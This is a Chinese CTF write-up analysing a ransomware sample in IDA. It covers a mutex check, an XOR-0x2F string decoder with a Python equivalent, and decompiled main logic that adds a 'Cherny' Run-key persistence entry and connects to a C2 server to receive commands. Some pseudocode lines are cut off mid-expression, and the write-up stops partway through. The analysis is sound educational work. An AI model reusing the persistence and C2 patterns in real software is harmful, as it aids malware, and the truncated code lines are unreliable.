
# [CTF] 勒索软件解锁(Ransomware Unchained)题解

- 原帖: `https://www.52pojie.cn/forum.php?mod=viewthread&tid=2022313`
- 抓取时间: `2026-11-01T22:11:00`

> Ransomware Unchained (勒索软件脱缰)
> 
> 一种神秘的勒索软件正在肆虐！它锁定文件，执行秘密命令，并与隐藏的 C2 服务器私语。你能分析这些痕迹，找到解密密钥，并在为时已晚之前拯救 flag 吗？

题目给了 一个`sample.exe` 和一个网络流量包 `capture.pcapng`。流量包暂时用不上，先看 `sample.exe`：

![](https://attach.52pojie.cn/forum/202504/16/120957vix3xd087i4h7p0p.png)

1.png (121.79 KB, 下载次数: 2)

[href="forum.php?mod=attachment&aid=Mjc3MTYxNHw0YjNjYmM1MXwxNzkzNTcxMDU4fDE2ODA4NnwyMDIyMzEz&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3MTYxNHw0YjNjYmM1MXwxNzkzNTcxMDU4fDE2ODA4NnwyMDIyMzEz&nothumb=yes)

2025-4-16 12:09 上传

MSVC 编译的，没有壳，拖到IDA：

![](https://attach.52pojie.cn/forum/202504/16/121000kikkkkgnxvuvss2q.png)

2.png (431.43 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=Mjc3MTYxNXw4MDE5ZjkwN3wxNzkzNTcxMDU4fDE2ODA4NnwyMDIyMzEz&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3MTYxNXw4MDE5ZjkwN3wxNzkzNTcxMDU4fDE2ODA4NnwyMDIyMzEz&nothumb=yes)

2025-4-16 12:10 上传

加载后，我们看到了非常清晰的结构。该程序没有混淆，使得分析相对简单。

## 字符串解密函数

![](https://attach.52pojie.cn/forum/202504/16/121002x3t9o30ictzcicci.png)

3.png (18.55 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=Mjc3MTYxNnw4ZWJiZDJiYnwxNzkzNTcxMDU4fDE2ODA4NnwyMDIyMzEz&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3MTYxNnw4ZWJiZDJiYnwxNzkzNTcxMDU4fDE2ODA4NnwyMDIyMzEz&nothumb=yes)

2025-4-16 12:10 上传

![](https://attach.52pojie.cn/forum/202504/16/121004jbfnwm6kww6wwyqw.png)

4.png (18.11 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=Mjc3MTYxN3w3NWNmZmEwYXwxNzkzNTcxMDU4fDE2ODA4NnwyMDIyMzEz&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3MTYxN3w3NWNmZmEwYXwxNzkzNTcxMDU4fDE2ODA4NnwyMDIyMzEz&nothumb=yes)

2025-4-16 12:10 上传

首先分析最外层。可以看到它创建了一个互斥锁，并检查错误代码是否为 `ERROR_ALREADY_EXISTS`(183)。

结合输出消息，我们可以推断这是一个检查，以确保只有一个进程实例正在运行。此外，`v3` 调用了一个未知函数，传递了一个看似加密的字符串作为第一个参数，所以需要知道 `v3` 是什么。

根据 `CreateMutexW` 函数原型，我们可以看到 `v3` 实际上是一个`LPCWSTR`：

```
HANDLE CreateMutexW(
  [in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes,
  [in]           BOOL                  bInitialOwner,
  [in, optional] LPCWSTR               lpName
);
```

`sub_1400013B0` 函数：

![](https://attach.52pojie.cn/forum/202504/16/121005n22uo0s02r11m124.png)

5.png (190.57 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=Mjc3MTYxOHw2Y2I1MDhjZXwxNzkzNTcxMDU4fDE2ODA4NnwyMDIyMzEz&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3MTYxOHw2Y2I1MDhjZXwxNzkzNTcxMDU4fDE2ODA4NnwyMDIyMzEz&nothumb=yes)

2025-4-16 12:10 上传

它看起来非常混乱; 显然已经使用 SIMD 进行了优化。让我们逐步分析：

```
  v2 = -1i64;

  v3 = a1;

  do

    ++v2;

  while ( a1[v2] );
```

这计算了 `a1` 的长度，并将 `a1` 赋值给 `v3`。它实际上是一个标准的 `strlen` 实现。

```
  v4 = (unsigned int)(2 * v2 + 2);
  if ( (unsigned int)(2 * v2) >= 0xFFFFFFFE )
    v4 = -1i64;
  v5 = (__m128i *)malloc(v4);
  memset(v5, 0, 2 * (int)v2 + 2);
  v6 = 0;
  v7 = v5;
```

这部分根据计算的长度分配了一个输出缓冲区 `v5`。缓冲区大小是输入的两倍，全部填充为 0，`v7` 作其别名。

```
  if ( (int)v2 > 0 )

  {

    if ( (unsigned int)v2 = v3 )

      goto LABEL_12;

    v9 = _mm_load_si128((const __m128i *)&xmmword_140005670);

    do

    {

      v10 = _mm_move_epi64(si128);

      v11 = _mm_xor_si128(_mm_loadl_epi64((const __m128i *)v3), v10);

      v6 += 32;

      *v7 = _mm_and_si128(_mm_srai_epi16(_mm_unpacklo_epi8(v11, v11), 8u), v9);

      v12 = _mm_xor_si128(_mm_loadl_epi64((const __m128i *)(v3 + 8)), v10);

      v7[1] = _mm_and_si128(_mm_srai_epi16(_mm_unpacklo_epi8(v12, v12), 8u), v9);

      v13 = _mm_xor_si128(_mm_loadl_epi64((const __m128i *)v3 + 1), v10);

      v7[2] = _mm_and_si128(_mm_srai_epi16(_mm_unpacklo_epi8(v13, v13), 8u), v9);

      v14 = _mm_loadl_epi64((const __m128i *)(v3 + 24));

      v3 += 32;

      v15 = _mm_xor_si128(v14, v10);

      v7[3] = _mm_and_si128(_mm_srai_epi16(_mm_unpacklo_epi8(v15, v15), 8u), v9);

      v7 += 4;

    }

    while ( v6 
```

这里的逻辑要关注这部分：

```
if ( (int)v2 > 0 )
...
v6 += 32;
...
if ( v6 
```

首先，这部分检查 `v2` (字符串长度) 是否为 0。如果不是，则处理该字符串。

`v6` 是已处理的输入字节数，`v3` 是指向输入字节的指针。可以看到，每个 SIMD 循环处理 32 个字节，而剩余部分则进入非 SIMD 循环来处理剩余字节。

核心逻辑：

```
v16 = (unsigned int)(v2 - v6);

do

{

  v7 = (__m128i *)((char *)v7 + 2);

  v17 = *v3++ ^ 0x2F;

  v7[-1].m128i_i16[7] = v17;

  --v16;

}

while (v16);
```

这个循环处理剩余的字节。

```
v7 = (__m128i *)((char *)v7 + 2);
v17 = *v3++ ^ 0x2F;
```

看起来它遍历 `v3` (即输入 `a1`) 的剩余字符，将它们与 `0x2F` 进行异或，并将输出指针前进两个字节（这实际上是将 ASCII 转换为宽字符）。

这显然是一个字符串解码函数。我们可以使用以下等效的 Python 函数来实现它：

```
def decode_str(encoded_string):

    decoded_chars = []

    for char in encoded_string:

        decoded_char_code = ord(char) ^ 0x2F

        decoded_chars.append(chr(decoded_char_code))

    return "".join(decoded_chars)
```

尝试解码初始字符串：

```
def main():
    encoded_str = 'lgj}avvdg`k'
    decoded_str = decode_str(encoded_str)
    print(decoded_str)
main()
```

> python .\decode.py

`CHERNYYKHOD`

解码成功，虽然似乎这个字符串用于互斥锁，对这题的意义不大。

## 主逻辑分析

在分析了字符串解密函数之后，让我们看一下主逻辑：

```
      ModuleHandleW = GetModuleHandleW(0i64);
      v5 = GetModuleHandleW(0i64);
      ResourceA = FindResourceA(v5, "DATA", "CONFIG");
      v7 = ResourceA;
      if ( ResourceA
        && (v8 = SizeofResource(ModuleHandleW, ResourceA), (Resource = LoadResource(ModuleHandleW, v7)) != 0i64)
        && (v10 = LockResource(Resource)) != 0i64
        && v8 >= 0x42 )
      {
        v11 = malloc(v8);
        memset(v11, 0, v8);
        memcpy(v11, v10, v8);
        sub_140001750(v11, v8);
        cp = (char *)v11;
        v12 = (const BYTE *)sub_140001530();
        if ( v12 )
        {
          *(_QWORD *)&hKey.sa_family = 0i64;
          if ( !RegOpenKeyExW(
                  HKEY_CURRENT_USER,
                  L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                  0,
                  0xF003Fu,
                  (PHKEY)&hKey) )
          {
            if ( *(_QWORD *)&hKey.sa_family )
            {
              cbData = 0;
              Type[0] = 1;
              if ( RegQueryValueExW(*(HKEY *)&hKey.sa_family, L"Cherny", 0i64, (LPDWORD)Type, 0i64, &cbData) == 2 )
              {
                v13 = -1i64;
                while ( *(_WORD *)&v12[2 * v13++ + 2] != 0 )
                  ;
                RegSetValueExW(*(HKEY *)&hKey.sa_family, L"Cherny", 0, 1u, v12, 2 * v13 + 2);
              }
              CloseHandle(*(HANDLE *)&hKey.sa_family);
            }
          }
        }
        *(_QWORD *)&hKey.sa_data[6] = 0i64;
        *(_OWORD *)&hReadPipe = 0i64;
        *(_OWORD *)&hObject = 0i64;
        *(_OWORD *)&hThread = 0i64;
        xmmword_140008730 = 0i64;
        if ( WSAStartup(0x202u, &WSAData) )
          return 0;
        hKey.sa_family = 2;
        *(_WORD *)hKey.sa_data = htons(*((_WORD *)cp + 32));
        *(_DWORD *)&hKey.sa_data[2] = inet_addr(cp);
        v15 = socket(2, 1, 6);
        while ( connect(v15, &hKey, 16) == -1 )
          ;
        *((_QWORD *)&xmmword_140008730 + 1) = v15;
        v16 = malloc(0x400ui64);
        memset(v16, 0, 0x400ui64);
        while ( recv(*((SOCKET *)&xmmword_140008730 + 1), (char *)v16, 1024, 0) )
        {
          sub_1400020C0((LPCSTR)v16);
          memset(v16, 0, 0x400ui64);
        }
        v17 = "Socket closed gracefully.";
```

逐段分析：

```
      ModuleHandleW = GetModuleHandleW(0i64);

      v5 = GetModuleHandleW(0i64);

      ResourceA = FindResourceA(v5, "DATA", "CONFIG");

      v7 = ResourceA;

      if ( ResourceA

        && (v8 = SizeofResource(ModuleHandleW, ResourceA), (Resource = LoadResource(ModuleHandleW, v7)) != 0i64)

        && (v10 = LockResource(Resource)) != 0i64

        && v8 >= 0x42 )

      {

        v11 = malloc(v8);

        memset(v11, 0, v8);

        memcpy(v11, v10, v8);

        sub_140001750(v11, v8);

        cp = (char *)v11;
```

通过查阅相关的 API 文档和函数原型，我们知道这段代码从 PE 文件资源中的 `DATA` 节读取 `CONFIG` 数据，将其存储在 `v10` 中，将数据长度存储在 `v8` 中，并验证其大小是否至少为 `0x42`。

然后，它分配一个该大小的新缓冲区 `v11`，并将数据从 `v10` 复制到 `v11` 中。

随后，它调用一个未知函数 `sub_140001750`，传递 `v11` 和 `v8`，然后将 `v11` 赋值给 `cp`。
